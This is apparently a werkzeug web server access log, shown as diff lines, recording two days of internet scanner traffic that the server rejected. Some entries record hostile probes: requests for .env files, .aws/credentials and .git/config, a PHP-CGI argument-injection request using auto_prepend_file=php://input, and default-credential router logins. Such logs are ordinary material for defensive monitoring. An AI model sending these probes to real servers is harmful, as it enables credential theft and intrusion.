+INFO:werkzeug:80.66.83.48 - - [13/Feb/2025 10:01:08] "[31m[1m\x04\x01\x00P¹\x190h\x00[0m" 400 -
+ERROR:werkzeug:80.66.83.48 - - [13/Feb/2025 10:02:08] code 400, message Bad request syntax ('\x05\x01\x00')
+INFO:werkzeug:80.66.83.48 - - [13/Feb/2025 10:02:08] "[31m[1m\x05\x01\x00[0m" 400 -
+INFO:werkzeug:80.66.83.48 - - [13/Feb/2025 10:02:08] "[33mCONNECT 185.25.48.104:80 HTTP/1.1[0m" 404 -
+INFO:werkzeug:206.168.34.217 - - [13/Feb/2025 10:30:14] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:206.168.34.217 - - [13/Feb/2025 10:30:33] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:206.168.34.217 - - [13/Feb/2025 10:30:34] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:206.168.34.217 - - [13/Feb/2025 10:30:34] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+INFO:werkzeug:193.68.89.51 - - [13/Feb/2025 10:40:25] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:206.168.34.35 - - [13/Feb/2025 10:44:10] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:206.168.34.35 - - [13/Feb/2025 10:44:13] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:206.168.34.35 - - [13/Feb/2025 10:44:13] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+INFO:werkzeug:167.94.138.37 - - [13/Feb/2025 11:05:46] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:185.7.214.81 - - [13/Feb/2025 11:16:54] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x03\x00\x8e\x01\x00\x00\x8a\x03\x03g\xadÔ¦¬]!&\x9fO\x89þ¥¢\x1a`¼y¸\x10`\x0e')
+INFO:werkzeug:185.7.214.81 - - [13/Feb/2025 11:16:54] "[31m[1m\x16\x03\x03\x00\x8e\x01\x00\x00\x8a\x03\x03g­Ô¦¬]!&\x9fO\x89þ¥¢\x1a`¼y¸\x10`\x0e\x85\x13bçÐ\x94×5ß°\x00\x00*À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À[0m" 400 -
+ERROR:werkzeug:185.7.214.81 - - [13/Feb/2025 11:16:54] code 400, message Bad request syntax ("\x16\x03\x03\x00\x8e\x01\x00\x00\x8a\x03\x03g\xadÔ¦tÑq\x155kfÚ~\x80-ÉÍîò\x89\x1bôí¹Î6î×\x82qËö\x00\x00*À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À")
+INFO:werkzeug:185.7.214.81 - - [13/Feb/2025 11:16:54] "[31m[1m\x16\x03\x03\x00\x8e\x01\x00\x00\x8a\x03\x03g­Ô¦tÑq\x155kfÚ~\x80-ÉÍîò\x89\x1bôí¹Î6î×\x82qËö\x00\x00*À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À[0m" 400 -
+INFO:werkzeug:176.65.128.61 - - [13/Feb/2025 11:37:39] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:184.105.247.234 - - [13/Feb/2025 12:00:46] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:184.105.247.242 - - [13/Feb/2025 12:01:44] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:184.105.247.210 - - [13/Feb/2025 12:02:18] "[33mGET http://api.ipify.org/?format=json HTTP/1.1[0m" 404 -
+INFO:werkzeug:184.105.247.234 - - [13/Feb/2025 12:02:44] "[33mCONNECT www.shadowserver.org:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:184.105.247.214 - - [13/Feb/2025 12:03:14] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [13/Feb/2025 12:33:51] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:172.93.107.98 - - [13/Feb/2025 12:46:31] "[33mCONNECT ip-api.com:443 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:162.243.66.204 - - [13/Feb/2025 12:59:32] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:162.243.66.204 - - [13/Feb/2025 12:59:32] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03¯n(p£¦\x1b\x8a.,ò/{2\x17\x93´}=©\x9fBo\x08\x98 \x90%q_`ª\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+ERROR:werkzeug:162.243.66.204 - - [13/Feb/2025 12:59:32] code 400, message Bad request version ('\x10')
+INFO:werkzeug:162.243.66.204 - - [13/Feb/2025 12:59:32] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03{J½\x08¸\x19Æ@\x1c\x8d\x1b{¶-r~`<\x1c9å\x7fIw\x09\x10[0m" 400 -
+INFO:werkzeug:162.243.66.204 - - [13/Feb/2025 12:59:32] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:162.243.66.204 - - [13/Feb/2025 12:59:32] "[33mGET /download/powershell/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:162.243.66.204 - - [13/Feb/2025 12:59:33] "[33mGET /get.php HTTP/1.1[0m" 404 -
+ERROR:werkzeug:195.178.110.163 - - [13/Feb/2025 13:04:50] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:04:50] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ß|ÍÇ£Ås*\x7fÜ&à6ì\\oÉ\x04¼Â|(\x80¼\x93\x84N\x1a%Ú8í \x93Ì"ðZ\x13\x1dð\x88ÜÖ@û1ÆTÈäß*áËT\x9fLç²&e\x06\x99w\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:04:51] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:04:51] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:04:53] "[33mGET /.env.default HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:04:53] "[33mGET /.env.dist HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:04:54] "[33mGET /.env.prod HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:04:54] "[33mGET /.env.testing HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:04:55] "[33mGET /.env.dev.local HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:04:55] "[33mGET /.env_sample HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:04:57] "[33mGET /.env.template HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:04:59] "[33mGET /.env.dev HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:00] "[33mGET /settings/.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:01] "[33mGET /.env.production HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:02] "[33mGET /.env.stage HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:02] "[33mGET /public/.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:03] "[33mGET /.aws/credentials HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:03] "[33mGET /www/.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:04] "[33mGET /.env.secret HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:04] "[33mGET /app/.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:06] "[33mGET /files/.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:07] "[33mGET /.env.bak HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:08] "[33mGET /configuration/.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:08] "[33mGET /core/.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:09] "[33mGET /build/.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:09] "[33mGET /dev/.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:10] "[33mGET /.env.development.local HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:11] "[33mGET /.env.sandbox HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [13/Feb/2025 13:05:12] "[33mGET /static../.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:115.231.78.14 - - [13/Feb/2025 13:08:36] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:115.231.78.14 - - [13/Feb/2025 13:08:36] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:115.231.78.14 - - [13/Feb/2025 13:08:39] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:115.231.78.14 - - [13/Feb/2025 13:08:39] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [13/Feb/2025 14:19:22] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:176.65.128.61 - - [13/Feb/2025 14:21:12] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:78.108.177.54 - - [13/Feb/2025 14:26:17] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:106.75.26.167 - - [13/Feb/2025 14:32:21] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.135.194.28 - - [13/Feb/2025 14:34:35] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [13/Feb/2025 15:26:26] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:204.76.203.83 - - [13/Feb/2025 15:27:03] code 400, message Bad request syntax ('\x05\x01\x00')
+INFO:werkzeug:204.76.203.83 - - [13/Feb/2025 15:27:03] "[31m[1m\x05\x01\x00[0m" 400 -
+INFO:werkzeug:193.68.89.51 - - [13/Feb/2025 16:14:47] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:64.23.141.198 - - [13/Feb/2025 16:23:39] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:64.23.141.198 - - [13/Feb/2025 16:23:39] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x87HÆ\x8etõý\x9d8w-û¨;$\x0bì\x93\x05kÒu\x85Í\x13ãTÙæc\x88h\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+ERROR:werkzeug:64.23.141.198 - - [13/Feb/2025 16:23:39] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:64.23.141.198 - - [13/Feb/2025 16:23:39] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x9d²¢sS£Eº\x10×{fÑ\x9fg»B®\x12\x8eå\x95-H­\x96¢û µ\x88m\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+INFO:werkzeug:64.23.141.198 - - [13/Feb/2025 16:23:39] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.23.141.198 - - [13/Feb/2025 16:23:39] "[33mGET /download/powershell/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.23.141.198 - - [13/Feb/2025 16:23:39] "[33mGET /get.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:94.240.37.34 - - [13/Feb/2025 16:45:27] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [13/Feb/2025 17:05:01] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.10 - - [13/Feb/2025 18:43:01] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:92.255.57.58 - - [13/Feb/2025 19:13:52] "[33mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1[0m" 404 -
+ERROR:werkzeug:198.235.24.13 - - [13/Feb/2025 19:14:49] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:198.235.24.13 - - [13/Feb/2025 19:14:49] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x1b®\x9aèÁ,ì\x09Û+{\x9a\x99{ay\x0bk\x11\x135£¡ä3ya2¡ê\x04â JVÆÏèÄ¡*\x93TbA\x17z\x1d\x1dïØÄ¾¦VÈ"K°\x12\x945û\x803\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+ERROR:werkzeug:198.235.24.13 - - [13/Feb/2025 19:14:50] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03ºªrP\x14îZ\x95ø{\x89R\x03{/Ð}.XÊ\x90°R\x9fÆ´Îd\x83\x05Î#\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+INFO:werkzeug:198.235.24.13 - - [13/Feb/2025 19:14:50] "[31m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03ºªrP\x14îZ\x95ø{\x89R\x03{/Ð}.XÊ\x90°R\x9fÆ´Îd\x83\x05Î#\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" 400 -
+INFO:werkzeug:45.135.194.28 - - [13/Feb/2025 19:17:11] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:92.255.57.58 - - [13/Feb/2025 19:33:44] "[33mGET /actuator/gateway/routes HTTP/1.1[0m" 404 -
+ERROR:werkzeug:45.79.163.72 - - [13/Feb/2025 19:49:33] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:45.79.163.72 - - [13/Feb/2025 19:49:33] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03îF\\¦85î¥"ÐÜ'g0Á\x0c§wHlþ`F\x8f\x10\x1a«/ªwGS Ê+ègÂß~8uÖèñÔ"¥à@ÂOY0\x17¡1\x1f\x04i.ø·\x97ê\x00&Ì©Ì¨À+À/À,À0À\x09À\x13À[0m" 400 -
+INFO:werkzeug:205.210.31.55 - - [13/Feb/2025 19:50:28] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [13/Feb/2025 20:31:08] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.10 - - [13/Feb/2025 20:39:22] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.224.0.187 - - [13/Feb/2025 21:55:38] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:167.94.145.99 - - [13/Feb/2025 22:12:20] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:167.94.145.99 - - [13/Feb/2025 22:12:23] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:167.94.145.99 - - [13/Feb/2025 22:12:23] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:167.94.145.99 - - [13/Feb/2025 22:12:23] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+INFO:werkzeug:193.68.89.10 - - [13/Feb/2025 22:35:20] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:104.207.51.236 - - [13/Feb/2025 22:45:54] code 400, message Bad request version ('\x92ö\x1a\x176^t\x15\x0f\x8b\x81JN9\x1aÓ7CZ¿2')
+INFO:werkzeug:104.207.51.236 - - [13/Feb/2025 22:45:54] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03rêcé\x04è\x9a\x97ý\x95Øj\x1bÄ\\\x1c~~|^þ¹þ®n\x87!Ñ\x0b÷\x8cO \x09\x92ö\x1a\x176^t\x15\x0f\x8b\x81JN9\x1aÓ7CZ¿2[0m" 400 -
+INFO:werkzeug:205.210.31.138 - - [13/Feb/2025 22:47:15] "[33mGET / HTTP/1.0[0m" 404 -
+ERROR:werkzeug:104.207.43.70 - - [13/Feb/2025 23:18:54] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:104.207.43.70 - - [13/Feb/2025 23:18:54] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x06\x003¼\x1c¼­%ý\x1e"\x06ù·îË´Kîz\x03\x9aò%<72_{\x86ÇU Î±N\x1cê\x91 my{\x0c¯Þó\x04¦t\x8fª4\x8f°êRË\x92LóF÷4\x85\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+ERROR:werkzeug:198.235.24.171 - - [13/Feb/2025 23:42:20] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:198.235.24.171 - - [13/Feb/2025 23:42:20] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03$õ¸ï(\x7fÂÎÛ\x06á\x1f¤\x84§¡Ûk!¦¤ôo,pK©ye/JD é\x0d,{w\x18C¨î(\x1eð\x9f\x17²ñ\x85¯ù´\x96TüX\x0f\x978bk=<r\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+ERROR:werkzeug:198.235.24.171 - - [13/Feb/2025 23:42:20] code 400, message Bad request version ('À(À$À\x14À')
+INFO:werkzeug:198.235.24.171 - - [13/Feb/2025 23:42:20] "[31m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03Äæ ¿\x08\x01i\x1f`\x1e÷«\x85½Ú>ï\x0d±Å@%õ\x06 y\x1dÖ\x17ñ-¼\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" 400 -
+INFO:werkzeug:45.135.194.28 - - [13/Feb/2025 23:47:47] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+ERROR:werkzeug:92.255.85.172 - - [13/Feb/2025 23:48:20] code 400, message Bad request version ("KÇ\x060o\x08\x00\x00&À,À+À0À/À$À#À(À'À")
+INFO:werkzeug:92.255.85.172 - - [13/Feb/2025 23:48:20] "[31m[1m\x16\x03\x03\x00\x93\x01\x00\x00\x8f\x03\x03g®\x84ÐZÌ¾}kæ$i\x82É"qõ ×\x05%Ï¦0$\x1fKÇ\x060o\x08\x00\x00&À,À+À0À/À$À#À(À'À[0m" 400 -
+INFO:werkzeug:45.156.130.8 - - [14/Feb/2025 00:18:34] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:40.86.176.117 - - [14/Feb/2025 00:22:02] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.10 - - [14/Feb/2025 00:39:58] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [14/Feb/2025 01:01:21] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:147.185.132.75 - - [14/Feb/2025 01:19:20] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:206.168.34.223 - - [14/Feb/2025 01:20:17] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:206.168.34.223 - - [14/Feb/2025 01:20:23] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:206.168.34.223 - - [14/Feb/2025 01:20:26] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:206.168.34.223 - - [14/Feb/2025 01:20:26] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+ERROR:werkzeug:92.255.85.59 - - [14/Feb/2025 01:36:10] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:92.255.85.59 - - [14/Feb/2025 01:36:10] "[31m[1m\x16\x03\x01\x00á\x01\x00\x00Ý\x03\x03r\x8b)\x8b \x0b\x8dbè\x15L;Þ1ÿdNAM\x9ft\x10¢û8n}v¤luc fxÏF\x0f\x0cb|ÞÜFÉ\x17¸¿j\x1fpÆ\x13|\x1bjGM\x8c\x12`¬âÝ\x03\x00$\x13\x03\x13\x01\x13\x02À/À+À0À,Ì©Ì¨À\x09À\x13À[0m" 400 -
+ERROR:werkzeug:92.255.85.59 - - [14/Feb/2025 01:36:10] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:92.255.85.59 - - [14/Feb/2025 01:36:10] "[31m[1m\x16\x03\x01\x00á\x01\x00\x00Ý\x03\x03\x9f·8U\x09Õ\x97yë\x06\x06T\x0dï\x9b\x19\x03U\x92\x0eªç±t\x0c\x1aÝ%/\x81Iî \x17q«\x1e\x13\x83z\x0f«OÏ\x09r\x80«\x8cR@Æ/ü\x1fÞèF\x8e\x94j\x9fö5£\x00$\x13\x03\x13\x01\x13\x02À/À+À0À,Ì©Ì¨À\x09À\x13À[0m" 400 -
+INFO:werkzeug:184.105.139.101 - - [14/Feb/2025 02:06:51] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:184.105.139.89 - - [14/Feb/2025 02:07:46] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:184.105.139.113 - - [14/Feb/2025 02:08:14] "[33mGET http://api.ipify.org/?format=json HTTP/1.1[0m" 404 -
+INFO:werkzeug:184.105.139.117 - - [14/Feb/2025 02:08:38] "[33mCONNECT www.shadowserver.org:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:184.105.139.89 - - [14/Feb/2025 02:09:08] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.93.89.118 - - [14/Feb/2025 02:14:03] "[33mPOST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.93.89.118 - - [14/Feb/2025 02:14:03] "[33mPOST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.10 - - [14/Feb/2025 03:49:41] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:80.82.68.18 - - [14/Feb/2025 04:01:48] code 400, message Bad request syntax ('.')
+INFO:werkzeug:80.82.68.18 - - [14/Feb/2025 04:01:48] "[31m[1m.[0m" 400 -
+INFO:werkzeug:172.93.107.98 - - [14/Feb/2025 04:06:26] "[33mCONNECT ip-api.com:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [14/Feb/2025 04:09:07] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.135.194.28 - - [14/Feb/2025 04:20:13] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.10 - - [14/Feb/2025 06:03:43] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:64.62.197.177 - - [14/Feb/2025 06:11:16] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:64.62.197.177 - - [14/Feb/2025 06:11:16] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03»\x96\x7f9\x82§Æ:¢ï½\x0c±¸m-ÌKwÙ¡d\x80Á\x04B£J\x1bý\x92¼\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+ERROR:werkzeug:104.45.233.77 - - [14/Feb/2025 06:56:05] code 400, message Bad request syntax ('MGLNDD_35.193.141.194_8080')
+INFO:werkzeug:104.45.233.77 - - [14/Feb/2025 06:56:05] "[31m[1mMGLNDD_35.193.141.194_8080[0m" 400 -
+INFO:werkzeug:205.210.31.155 - - [14/Feb/2025 07:01:01] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:103.207.124.175 - - [14/Feb/2025 07:13:28] "[33mGET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0[0m" 404 -
+ERROR:werkzeug:66.228.44.196 - - [14/Feb/2025 07:48:33] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:66.228.44.196 - - [14/Feb/2025 07:48:33] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ÑçJ(EÌ¶¿õ\x05Ý;:Ñõ¸\x19bQ\x02LG\x15\x9a¿ã(·î\x97'? ¾¯Í\x0f\x93HÀÎ\x81"óP\x1b02ä\x10\x0ee\x02/\x01.É\x035zR¥\x7f\x1aÛ\x00&Ì©Ì¨À+À/À,À0À\x09À\x13À[0m" 400 -
+INFO:werkzeug:193.68.89.10 - - [14/Feb/2025 08:04:41] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:60.191.125.35 - - [14/Feb/2025 08:47:04] "[33mHEAD http://112.124.42.80:63435/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.135.194.28 - - [14/Feb/2025 09:00:12] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [14/Feb/2025 10:36:30] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:104.234.115.15 - - [14/Feb/2025 11:15:27] "[33m\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00GET / HTTP/1.0[0m" 404 -
+ERROR:werkzeug:104.234.115.15 - - [14/Feb/2025 11:15:31] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:104.234.115.15 - - [14/Feb/2025 11:15:31] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03YU\x8c\x85gï¦ä\x07Çn°E\x8c£òXËå¹«|n*Hu9Ù¥)g±\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+INFO:werkzeug:104.234.115.15 - - [14/Feb/2025 11:15:43] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:104.234.115.15 - - [14/Feb/2025 11:15:50] "[33mGET /manage/account/login HTTP/1.1[0m" 404 -
+INFO:werkzeug:104.234.115.15 - - [14/Feb/2025 11:15:52] "[33mGET /admin/index.html HTTP/1.1[0m" 404 -
+INFO:werkzeug:104.234.115.15 - - [14/Feb/2025 11:15:54] "[33mGET /index.html HTTP/1.1[0m" 404 -
+INFO:werkzeug:104.234.115.15 - - [14/Feb/2025 11:15:55] "[33mGET /+CSCOE+/logon.html HTTP/1.1[0m" 404 -
+INFO:werkzeug:104.234.115.15 - - [14/Feb/2025 11:15:57] "[33mGET /cgi-bin/login.cgi HTTP/1.1[0m" 404 -
+INFO:werkzeug:104.234.115.15 - - [14/Feb/2025 11:15:59] "[33mGET /login.htm HTTP/1.1[0m" 404 -
+INFO:werkzeug:104.234.115.15 - - [14/Feb/2025 11:16:00] "[33mGET /login.jsp HTTP/1.1[0m" 404 -
+INFO:werkzeug:104.234.115.15 - - [14/Feb/2025 11:16:02] "[33mGET /doc/index.html HTTP/1.1[0m" 404 -
+INFO:werkzeug:104.234.115.15 - - [14/Feb/2025 11:16:04] "[33mGET /remote/login HTTP/1.1[0m" 404 -
+INFO:werkzeug:104.234.115.15 - - [14/Feb/2025 11:16:06] "[33mGET /admin/login.asp HTTP/1.1[0m" 404 -
+ERROR:werkzeug:80.82.68.18 - - [14/Feb/2025 11:40:54] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:80.82.68.18 - - [14/Feb/2025 11:40:54] "[31m[1m\x16\x03\x01\x00þ\x01\x00\x00ú\x03\x03\x95a²p\x8a\x01Dz\x99)Gä&e¯¾ó\x09º\x1eàÂ¡ï\x88mjÖi\x9d;½ m©«?\x88ùaâs\x86\x823w^ª\x1e[|\x17\x95ë\x85ÖÒ\x8a\x07Cý\x0dUÌ¬\x002À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+ERROR:werkzeug:80.82.68.18 - - [14/Feb/2025 11:40:55] code 400, message Bad request syntax ('\x16\x03\x01\x00à\x01\x00\x00Ü\x03\x03ú[nñ\\F\x024-\x95ñ$>¾ba\x9a\x12\x0eHÃ\x84v5ü\x82}/§\x13RI\x00\x00hÀ\x08\x00\x14\x00\x04\x00¢\x00')
+INFO:werkzeug:80.82.68.18 - - [14/Feb/2025 11:40:55] "[31m[1m\x16\x03\x01\x00à\x01\x00\x00Ü\x03\x03ú[nñ\\F\x024-\x95ñ$>¾ba\x9a\x12\x0eHÃ\x84v5ü\x82}/§\x13RI\x00\x00hÀ\x08\x00\x14\x00\x04\x00¢\x00[0m" 400 -
+ERROR:werkzeug:80.82.68.18 - - [14/Feb/2025 11:40:56] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ô\x01\x00\x00Ð\x03\x03&\x88\x03,r\x86Õtç\x10@ÔÑnsrß¢!')
+INFO:werkzeug:80.82.68.18 - - [14/Feb/2025 11:40:56] "[31m[1m\x16\x03\x01\x00Ô\x01\x00\x00Ð\x03\x03&\x88\x03,r\x86Õtç\x10@ÔÑnsrß¢!\x0c\x92\x91ïºÅ~;\x930egþ\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ[0m" 400 -
